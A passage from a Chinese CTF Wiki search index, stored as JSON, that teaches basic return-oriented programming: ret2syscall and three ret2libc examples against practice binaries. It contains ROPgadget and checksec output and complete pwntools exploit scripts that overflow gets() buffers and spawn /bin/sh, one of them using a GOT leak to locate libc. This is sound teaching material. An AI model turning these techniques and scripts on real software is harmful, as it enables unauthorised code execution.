\u7684\u504f\u79fb\u4e3a 112\u3002\u6b64\u6b21\uff0c\u7531\u4e8e\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u67d0\u4e00\u6bb5\u4ee3\u7801\u6216\u8005\u81ea\u5df1\u586b\u5199\u4ee3\u7801\u6765\u83b7\u5f97 shell\uff0c\u6240\u4ee5\u6211\u4eec\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684 gadgets \u6765\u83b7\u5f97 shell\uff0c\u800c\u5bf9\u5e94\u7684 shell \u83b7\u53d6\u5219\u662f\u5229\u7528\u7cfb\u7edf\u8c03\u7528\u3002\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u7684\u77e5\u8bc6\uff0c\u8bf7\u53c2\u8003 https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8 \u7b80\u5355\u5730\u8bf4\uff0c\u53ea\u8981\u6211\u4eec\u628a\u5bf9\u5e94\u83b7\u53d6 shell \u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u653e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6267\u884c int 0x80 \u5c31\u53ef\u6267\u884c\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6 shell execve ( \"/bin/sh\" , NULL , NULL ) \u5176\u4e2d\uff0c\u8be5\u7a0b\u5e8f\u662f 32 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f7f\u5f97 \u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u5373 eax \u5e94\u8be5\u4e3a 0xb \u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5373 ebx \u5e94\u8be5\u6307\u5411 /bin/sh \u7684\u5730\u5740\uff0c\u5176\u5b9e\u6267\u884c sh \u7684\u5730\u5740\u4e5f\u53ef\u4ee5\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5373 ecx \u5e94\u8be5\u4e3a 0 \u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u5373 edx \u5e94\u8be5\u4e3a 0 \u800c\u6211\u4eec\u5982\u4f55\u63a7\u5236\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c \u5462\uff1f\u8fd9\u91cc\u5c31\u9700\u8981\u4f7f\u7528 gadgets\u3002\u6bd4\u5982\u8bf4\uff0c\u73b0\u5728\u6808\u9876\u662f 10\uff0c\u90a3\u4e48\u5982\u679c\u6b64\u65f6\u6267\u884c\u4e86pop eax\uff0c\u90a3\u4e48\u73b0\u5728 eax \u7684\u503c\u5c31\u4e3a 10\u3002\u4f46\u662f\u6211\u4eec\u5e76\u4e0d\u80fd\u671f\u5f85\u6709\u4e00\u6bb5\u8fde\u7eed\u7684\u4ee3\u7801\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u6bb5\u4e00\u6bb5\u63a7\u5236\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u5728 gadgets \u6700\u540e\u4f7f\u7528 ret \u6765\u518d\u6b21\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u7684\u539f\u56e0\u3002\u5177\u4f53\u5bfb\u627e gadgets\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ropgadgets \u8fd9\u4e2a\u5de5\u5177\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6765\u5bfb\u627e\u63a7\u5236 eax \u7684gadgets \u279c ret2syscall ROPgadget --binary rop --only 'pop|ret' | grep 'eax' 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret \u53ef\u4ee5\u770b\u5230\u6709\u4e0a\u8ff0\u51e0\u4e2a\u90fd\u53ef\u4ee5\u63a7\u5236 eax\uff0c\u6211\u9009\u53d6\u7b2c\u4e8c\u4e2a\u6765\u4f5c\u4e3a gadgets\u3002 \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u63a7\u5236\u5176\u5b83\u5bc4\u5b58\u5668\u7684 gadgets \u279c ret2syscall ROPgadget --binary rop --only 'pop|ret' | grep 'ebx' 0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x080be23f : pop ebx ; pop edi ; ret 0x0806eb69 : pop ebx ; pop edx ; ret 0x08092258 : pop ebx ; pop esi ; pop ebp ; ret 0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x08048913 : pop ebx ; pop esi ; pop edi ; ret 0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4 0x08049a94 : pop ebx ; pop esi ; ret 0x080481c9 : pop ebx ; ret 0x080d7d3c : pop ebx ; ret 0x6f9 0x08099c87 : pop ebx ; ret 8 0x0806eb91 : pop ecx ; pop ebx ; ret 0x0806336b : pop edi ; pop esi ; pop ebx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret 0x0805c820 : pop esi ; pop ebx ; ret 0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0807b6ed : pop ss ; pop ebx ; ret \u8fd9\u91cc\uff0c\u6211\u9009\u62e9 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret \u8fd9\u4e2a\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u5176\u5b83\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u9700\u8981\u83b7\u5f97 /bin/sh \u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002 \u279c ret2syscall ROPgadget --binary rop --string '/bin/sh' Strings information ============================================================ 0x080be408 : /bin/sh \u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u6b64\u5916\uff0c\u8fd8\u6709 int 0x80 \u7684\u5730\u5740\uff0c\u5982\u4e0b \u279c ret2syscall ROPgadget --binary rop --only 'int' Gadgets information ============================================================ 0x08049421 : int 0x80 0x080938fe : int 0xbb 0x080869b5 : int 0xf6 0x0807b4d4 : int 0xfc Unique gadgets found: 4 \u540c\u65f6\uff0c\u4e5f\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002 \u4e0b\u9762\u5c31\u662f\u5bf9\u5e94\u7684 payload\uff0c\u5176\u4e2d 0xb \u4e3a execve \u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u3002 #!/usr/bin/env python from pwn import * sh = process ( './rop' ) pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 int_0x80 = 0x08049421 binsh = 0x80be408 payload = flat ( [ 'A' * 112 , pop_eax_ret , 0xb , pop_edx_ecx_ebx_ret , 0 , 0 , binsh , int_0x80 ]) sh . sendline ( payload ) sh . interactive ()","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/basic_rop/#_8","text":"","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/basic_rop/#ret2libc","text":"","title":"ret2libc"},{"location":"pwn/stackoverflow/basic_rop/#_9","text":"ret2libc \u5373\u63a7\u5236\u51fd\u6570\u7684\u6267\u884c libc \u4e2d\u7684\u51fd\u6570\uff0c\u901a\u5e38\u662f\u8fd4\u56de\u81f3\u67d0\u4e2a\u51fd\u6570\u7684 plt \u5904\u6216\u8005\u51fd\u6570\u7684\u5177\u4f53\u4f4d\u7f6e(\u5373\u51fd\u6570\u5bf9\u5e94\u7684 got\u8868\u9879\u7684\u5185\u5bb9)\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u9009\u62e9\u6267\u884c system(\"/bin/sh\")\uff0c\u6545\u800c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u77e5\u9053 system \u51fd\u6570\u7684\u5730\u5740\u3002","title":"\u539f\u7406"},{"location":"pwn/stackoverflow/basic_rop/#_10","text":"\u6211\u4eec\u7531\u7b80\u5355\u5230\u96be\u5206\u522b\u7ed9\u51fa\u4e09\u4e2a\u4f8b\u5b50\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/stackoverflow/basic_rop/#1","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 bamboofox \u4e2d ret2libc1 \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2libc1 \u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4 \u279c ret2libc1 checksec ret2libc1 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u6e90\u7a0b\u5e8f\u4e3a 32 \u4f4d\uff0c\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u3002\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6e90\u4ee3\u7801\uff0c\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( _bss_start , 0 , 1 , 0 ); puts ( \"RET2LIBC >_<\" ); gets (( char * ) & v4 ); return 0 ; } \u53ef\u4ee5\u770b\u5230\u5728\u6267\u884c gets \u51fd\u6570\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\u6b64\u5916\uff0c\u5229\u7528 ropgadget\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u662f\u5426\u6709 /bin/sh \u5b58\u5728 \u279c ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh' Strings information ============================================================ 0x08048720 : /bin/sh \u786e\u5b9e\u5b58\u5728\uff0c\u518d\u6b21\u67e5\u627e\u4e00\u4e0b\u662f\u5426\u6709 system \u51fd\u6570\u5b58\u5728\u3002\u7ecf\u5728 ida \u4e2d\u67e5\u627e\uff0c\u786e\u5b9e\u4e5f\u5b58\u5728\u3002 .plt: 08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] \u90a3\u4e48\uff0c\u6211\u4eec\u76f4\u63a5\u8fd4\u56de\u8be5\u5904\uff0c\u5373\u6267\u884c system \u51fd\u6570\u3002\u76f8\u5e94\u7684 payload \u5982\u4e0b #!/usr/bin/env python from pwn import * sh = process ( './ret2libc1' ) binsh_addr = 0x8048720 system_plt = 0x08048460 payload = flat ([ 'a' * 112 , system_plt , 'b' * 4 , binsh_addr ]) sh . sendline ( payload ) sh . interactive () \u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u51fd\u6570\u8c03\u7528\u6808\u7684\u7ed3\u6784\uff0c\u5982\u679c\u662f\u6b63\u5e38\u8c03\u7528 system \u51fd\u6570\uff0c\u6211\u4eec\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u91cc\u4ee5 'bbbb' \u4f5c\u4e3a\u865a\u5047\u7684\u5730\u5740\uff0c\u5176\u540e\u53c2\u6570\u5bf9\u5e94\u7684\u53c2\u6570\u5185\u5bb9\u3002 \u8fd9\u4e2a\u4f8b\u5b50\u76f8\u5bf9\u6765\u8bf4\u7b80\u5355\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86 system \u5730\u5740\u4e0e /bin/sh \u7684\u5730\u5740\uff0c\u4f46\u662f\u5927\u591a\u6570\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u6709\u8fd9\u4e48\u597d\u7684\u60c5\u51b5\u3002","title":"\u4f8b1"},{"location":"pwn/stackoverflow/basic_rop/#2","text":"\u8fd9\u91cc\u4ee5 bamboofox \u4e2d\u7684 ret2libc2 \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2libc2 \u8be5\u9898\u76ee\u4e0e\u4f8b 1 \u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u518d\u51fa\u73b0 /bin/sh \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6b64\u6b21\u9700\u8981\u6211\u4eec\u81ea\u5df1\u6765\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e24\u4e2a gadgets\uff0c\u7b2c\u4e00\u4e2a\u63a7\u5236\u7a0b\u5e8f\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u63a7\u5236\u7a0b\u5e8f\u6267\u884c system(\"\"/bin/sh\")\u3002\u7531\u4e8e\u6f0f\u6d1e\u4e0e\u4e0a\u8ff0\u4e00\u81f4\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5728\u591a\u8bf4\uff0c\u5177\u4f53\u7684 exp \u5982\u4e0b ##!/usr/bin/env python from pwn import * sh = process ( './ret2libc2' ) gets_plt = 0x08048460 system_plt = 0x08048490 pop_ebx = 0x0804843d buf2 = 0x804a080 payload = flat ( [ 'a' * 112 , gets_plt , pop_ebx , buf2 , system_plt , 0xdeadbeef , buf2 ]) sh . sendline ( payload ) sh . sendline ( '/bin/sh' ) sh . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u8fd9\u91cc\u5411\u7a0b\u5e8f\u4e2d bss \u6bb5\u7684 buf2 \u5904\u5199\u5165 /bin/sh \u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u5730\u5740\u4f5c\u4e3a system \u7684\u53c2\u6570\u4f20\u5165\u3002\u8fd9\u6837\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u83b7\u5f97 shell\u3002","title":"\u4f8b2"},{"location":"pwn/stackoverflow/basic_rop/#3","text":"\u8fd9\u91cc\u4ee5 bamboofox \u4e2d\u7684 ret2libc3 \u4e3a\u4f8b \u70b9\u51fb\u4e0b\u8f7d: ret2libc3 \u5728\u4f8b 2 \u7684\u57fa\u7840\u4e0a\uff0c\u518d\u6b21\u5c06 system \u51fd\u6570\u7684\u5730\u5740\u53bb\u6389\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u540c\u65f6\u627e\u5230 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u9996\u5148\uff0c\u67e5\u770b\u5b89\u5168\u4fdd\u62a4 \u279c ret2libc3 checksec ret2libc3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4ecd\u65e7\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u8fdb\u800c\u67e5\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u7a0b\u5e8f\u7684 bug \u4ecd\u7136\u662f\u6808\u6ea2\u51fa int __cdecl main ( int argc , const char ** argv , const char ** envp ) { int v4 ; // [sp+1Ch] [bp-64h]@1 setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stdin , 0 , 1 , 0 ); puts ( \"No surprise anymore, system disappeard QQ.\" ); printf ( \"Can you find it !?\" ); gets (( char * ) & v4 ); return 0 ; } \u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f97\u5230 system \u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u8fd9\u91cc\u5c31\u4e3b\u8981\u5229\u7528\u4e86\u4e24\u4e2a\u77e5\u8bc6\u70b9 system \u51fd\u6570\u5c5e\u4e8e libc\uff0c\u800c libc.so \u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u51fd\u6570\u4e4b\u95f4\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\u3002 \u5373\u4f7f\u7a0b\u5e8f\u6709 ASLR \u4fdd\u62a4\uff0c\u4e5f\u53ea\u662f\u9488\u5bf9\u4e8e\u5730\u5740\u4e2d\u95f4\u4f4d\u8fdb\u884c\u968f\u673a\uff0c\u6700\u4f4e\u768412\u4f4d\u5e76\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u800c libc \u5728github\u4e0a\u6709\u4eba\u8fdb\u884c\u6536\u96c6\uff0c\u5982\u4e0b https://github.com/niklasb/libc-database \u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053 libc \u4e2d\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u8be5\u7a0b\u5e8f\u5229\u7528\u7684 libc\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053 system\u51fd\u6570\u7684\u5730\u5740\u3002 \u90a3\u4e48\u5982\u4f55\u5f97\u5230 libc \u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u6211\u4eec\u4e00\u822c\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u91c7\u7528 got \u8868\u6cc4\u9732\uff0c\u5373\u8f93\u51fa\u67d0\u4e2a\u51fd\u6570\u5bf9\u5e94\u7684 got \u8868\u9879\u7684\u5185\u5bb9\u3002 \u5f53\u7136\uff0c\u7531\u4e8e libc \u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff0c\u6211\u4eec\u9700\u8981\u6cc4\u6f0f\u5df2\u7ecf\u6267\u884c\u8fc7\u7684\u51fd\u6570\u7684\u5730\u5740\u3002 \u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u6b65\u9aa4\u5148\u5f97\u5230 libc\uff0c\u4e4b\u540e\u5728\u7a0b\u5e8f\u4e2d\u67e5\u8be2\u504f\u79fb\uff0c\u7136\u540e\u518d\u6b21\u83b7\u53d6 system \u5730\u5740\uff0c\u4f46\u8fd9\u6837\u624b\u5de5\u64cd\u4f5c\u6b21\u6570\u592a\u591a\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a libc \u7684\u5229\u7528\u5de5\u5177\uff0c\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003 readme https://github.com/lieanu/LibcSearcher \u6b64\u5916\uff0c\u5728\u5f97\u5230 libc \u4e4b\u540e\uff0c\u5176\u5b9e libc \u4e2d\u4e5f\u662f\u6709 /bin/sh \u5b57\u7b26\u4e32\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e00\u8d77\u83b7\u5f97 /bin/sh \u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002 \u8fd9\u91cc\u6211\u4eec\u6cc4\u9732 __libc_start_main \u7684\u5730\u5740\uff0c\u8fd9\u662f\u56e0\u4e3a\u5b83\u662f\u7a0b\u5e8f\u6700\u521d\u88ab\u6267\u884c\u7684\u5730\u65b9\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u6cc4\u9732 __libc_start_main \u5730\u5740 \u83b7\u53d6 libc \u7248\u672c \u83b7\u53d6 system \u5730\u5740\u4e0e /bin/sh \u7684\u5730\u5740 \u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f \u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884c system(\u2018/bin/sh\u2019) exp \u5982\u4e0b #!/usr/bin/env python from pwn import * from LibcSearcher import LibcSearcher sh = process ( './ret2libc3' ) ret2libc3 = ELF ( './ret2libc3' ) puts_plt = ret2libc3 . plt [ 'puts' ] libc_start_main_got = ret2libc3 . got [ '__libc_start_main' ] main = ret2libc3 . symbols [ 'main' ] print \"leak libc_start_main_got addr and return to main again\" payload = flat ([ 'A' * 112 , puts_plt , main , libc_start_main_got ]) sh . sendlineafter ( 'Can you find it !?' , payload ) print \"get the related addr\" libc_start_main_addr = u32 ( sh . recv ()[ 0 : 4 ]) libc = LibcSearcher ( '__libc_start_main' , libc_start_main_addr ) libcbase = libc_start_main_addr - libc . dump ( '__libc_start_main' ) system_addr = libcbase + libc . dump ( 'system' ) binsh_addr = libcbase + libc . dump ( 'str_bin_sh' ) print \"get shell\" payload = flat ([ 'A' * 104 , system_addr , 0xdeadbeef , binsh_addr ]) sh . sendline ( payload ) sh . interactive ()","title":"\u4f8b3"},{"location":"pwn/stackoverflow/basic_rop/#_11","text":"train.cs.nctu.edu.tw: ret2libc","title":"\u9898\u76ee"},{"location":"pwn/stackoverflow/basic_rop/#shell","text":"\u8fd9\u91cc\u603b\u7ed3\u51e0\u79cd\u5e38\u89c1\u7684\u83b7\u53d6 shell \u7684\u65b9\u5f0f\uff1a \u6267\u884c shellcode\uff0c\u8fd9\u4e00\u65b9\u9762\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u60c5\u51b5 \u53ef\u4ee5\u76f4\u63a5\u8fd4\u56de shell \u53ef\u4ee5\u5c06 shell \u8fd4\u56de\u5230\u67d0\u4e00\u4e2a\u7aef\u53e3 shellcode \u4e2d\u5b57\u7b26\u6709\u65f6\u5019\u9700\u8981\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42 \u6ce8\u610f\uff0c\u6211\u4eec\u9700\u8981\u5c06 shellcode \u5199\u5728\u53ef\u4ee5\u6267\u884c\u7684\u5185\u5b58\u533a\u57df\u4e2d\u3002 \u6267\u884c system(\"/bin/sh\")\uff0csystem('sh') \u7b49\u7b49 \u5173\u4e8e system \u7684\u5730\u5740\uff0c\u53c2\u89c1\u4e0b\u9762\u7ae0\u8282\u7684 \u5730\u5740\u5bfb\u627e \u3002 \u5173\u4e8e \"/bin/sh\"\uff0c \u201csh\u201d \u9996\u5148\u5bfb\u627e binary \u91cc\u9762\u6709\u6ca1\u6709\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c \u6bd4\u5982\u8bf4\u6709 flush \u51fd\u6570\uff0c\u90a3\u5c31\u4e00\u5b9a\u6709 sh \u4e86 \u8003\u8651\u4e2a\u4eba\u8bfb\u53d6\u5bf9\u5e94\u5b57\u7b26\u4e32 libc \u4e2d\u5176\u5b9e\u662f\u6709 /bin/sh \u7684 \u4f18\u70b9 \u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u3002 \u7f3a\u70b9 \u6709\u53ef\u80fd\u56e0\u4e3a\u7834\u574f\u73af\u5883\u53d8\u91cf\u800c\u65e0\u6cd5\u6267\u884c\u3002 \u6267\u884c execve(\"/bin/sh\",NULL,NULL) \u524d\u51e0\u6761\u540c system \u4f18\u70b9 \u51e0\u4e4e\u4e0d\u53d7\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u3002 \u7f3a\u70b9 \u9700\u8981 3 \u4e2a\u53c2\u6570\u3002 \u7cfb\u7edf\u8c03\u7528 \u7cfb\u7edf\u8c03\u7528\u53f7 __NR_execve \u5728 IA-32 \u4e2d\u4e3a 11\uff0cx86-64 \u4e3a 59","title":"shell \u83b7\u53d6\u5c0f\u7ed3"},{"location":"pwn/stackoverflow/basic_rop/#_12","text":"\u5728\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u603b\u662f\u514d\u4e0d\u4e86\u8981\u53bb\u5bfb\u627e\u4e00\u4e9b\u5730\u5740\uff0c\u5e38\u89c1\u7684\u5bfb\u627e\u5730\u5740\u7684\u7c7b\u578b\u6709\u5982\u4e0b\u51e0\u79cd","title":"\u5730\u5740\u5bfb\u627e\u5c0f\u7ed3"},{"location":"pwn/stackoverflow/basic_rop/#_13","text":"","title":"\u901a\u7528\u5bfb\u627e"},{"location":"pwn/stackoverflow/basic_rop/#_14","text":"\u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u76f8\u5173\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5229\u7528\u4e86\u3002","title":"\u76f4\u63a5\u5730\u5740\u5bfb\u627e"},{"location":"pwn/stackoverflow/basic_rop/#got","text":"\u6709\u65f6\u5019\u6211\u4eec\u5e76\u4e0d\u4e00\u5b9a\u975e\u5f97\u76f4\u63a5\u77e5\u9053\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u5229\u7528 GOT \u8868\u8df3\u8f6c\u5230\u5bf9\u5e94\u51fd\u6570\u7684\u5730\u5740\u3002\u5f53\u7136\uff0c\u5982\u679c\u6211\u4eec\u975e\u5f97\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 write\uff0cputs \u7b49\u8f93\u51fa\u51fd\u6570\u5c06 GOT \u8868\u4e2d\u5730\u5740\u5904\u5bf9\u5e94\u7684\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff08 \u524d\u63d0\u662f\u8fd9\u4e2a\u51fd\u6570\u5df2\u7ecf\u88ab\u89e3\u6790\u4e00\u6b21\u4e86 \uff09\u3002","title":"got \u8868\u5bfb\u627e"},{"location":"pwn/stackoverflow/basic_rop/#libc","text":"\u76f8\u5bf9\u504f\u79fb\u5bfb\u627e \uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5229\u7528 libc \u4e2d\u51fd\u6570\u7684\u57fa\u5730\u5740\u4e00\u6837\u8fd9\u4e2a\u7279\u6027\u6765\u5bfb\u627e\u4e86\u3002\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 __libc_start_main \u7684\u5730\u5740\u6765\u6cc4\u6f0f libc \u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002 \u6ce8\u610f\uff1a\u4e0d\u8981\u9009\u62e9\u6709wapper\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u4f1a\u4f7f\u5f97\u51fd\u6570\u7684\u57fa\u5730\u5740\u8ba1\u7b97\u4e0d\u6b63\u786e\u3002 \u5e38\u89c1\u7684\u6709wapper \u7684\u51fd\u6570\u6709\uff1f\uff08\u5f85\u8865\u5145\uff09\u3002","title":"\u6709 libc"},{"location":"pwn/stackoverflow/basic_rop/#libc_1","text":"\u5176\u5b9e\uff0c\u8fd9\u79cd\u60c5\u51b5\u7684\u89e3\u51b3\u7b56\u7565\u5206\u4e3a\u4e24\u79cd \u60f3\u529e\u6cd5\u83b7\u53d6 libc \u60f3\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u3002 \u800c\u5bf9\u4e8e\u60f3\u8981\u6cc4\u9732\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ea\u662f\u5355\u7eaf\u5730\u9700\u8981\u5176\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u6240\u4ee5 puts \uff0c write\uff0cprintf \u5747\u53ef\u4ee5\u3002 puts\uff0cprintf \u4f1a\u6709 \\x00 \u622a\u65ad\u7684\u95ee\u9898 write \u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\u8f93\u51fa\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u76f8\u5e94\u7684\u65b9\u6cd5","title":"\u65e0 libc"},{"location":"pwn/stackoverflow/basic_rop/#pwnlibdynelf","text":"\u524d\u63d0\u662f\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732\u4efb\u610f\u5730\u5740\u7684\u5185\u5bb9\u3002 \u5982\u679c\u8981\u4f7f\u7528 write 